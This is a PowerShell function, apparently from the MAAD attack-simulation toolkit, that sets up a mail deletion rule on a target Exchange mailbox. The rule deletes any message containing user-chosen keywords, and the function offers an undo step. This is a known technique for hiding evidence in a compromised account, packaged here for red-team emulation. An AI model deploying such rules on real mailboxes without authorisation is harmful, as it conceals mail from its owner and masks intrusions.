function MailboxDeleteRuleSetup {	
    mitre_details("MailboxDeleteRuleSetup")

    EnterMailbox("`n[?] Enter mailbox address to setup mail deletion rule on")

    #Enter account to compromise
    $target_mailbox = $global:mailbox_address
    $InboxRuleName = Read-Host -Prompt "`n[?] Enter a new mailbox rule name"
    
    #Take keywords for the mailbox rule
    do {
        $input_rule_keywords = Read-Host -Prompt "`n[?] Enter keyword / keywords (separated by ,) to configure the deletion rule"
        Write-Host ""

        if ($input_rule_keywords -eq $null) {
            MAADWriteError "Its not a compliment. Try coming up with a few words ;)"
        }
    } while (
        $input_rule_keywords -eq $null
    )
    
    $rule_keywords = $input_rule_keywords.Split(",").TrimStart()

    MAADWriteProcess "Deploying mail deletion rule"
    MAADWriteProcess "Rule Config: Rule($InboxRuleName) -> Mailbox($target_mailbox)"
    
    #Setup Inbox Rules
    try {
        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $target_mailbox -Confirm:$false -ErrorAction Stop | Out-Null
        Start-Sleep -s 10
        MAADWriteProcess "Mail deletion rule deployed"

        #Confirm new rule setup
        MAADWriteProcess "Retrieving mailbox rule info"
        #Get-InboxRule $InboxRuleName -Mailbox $target_mailbox | Format-Table -Property Name, Enabled, Priority, RuleIdentity
        $rule_info = Get-InboxRule $InboxRuleName -Mailbox $target_mailbox
        MAADWriteProcess "Rule Name: $($rule_info.Name)"
        MAADWriteProcess "Rule Enabled: $($rule_info.Enabled)"
        MAADWriteProcess "Rule Identity: $($rule_info.RuleIdentity)"

        MAADWriteSuccess "Mail deletion rule delployed" 
        $allow_undo = $true
    }
    catch {
        MAADWriteError "Failed to deploy mail deletion rule"
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $user_choice = Read-Host -Prompt "`n[?] Undo: Delete new mailbox rule (y/n)"
        Write-Host ""

        if ($user_choice -notin "No","no","N","n"){
            try {
                MAADWriteProcess "Deleting mailbox rule -> $InboxRuleName"
                Remove-InboxRule -Mailbox $target_mailbox -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
                MAADWriteSuccess "Deleted mailbox rule"
            }
            catch {
                MAADWriteError "Failed to delete mailbox rule"
            }
        }
    }
    MAADPause
}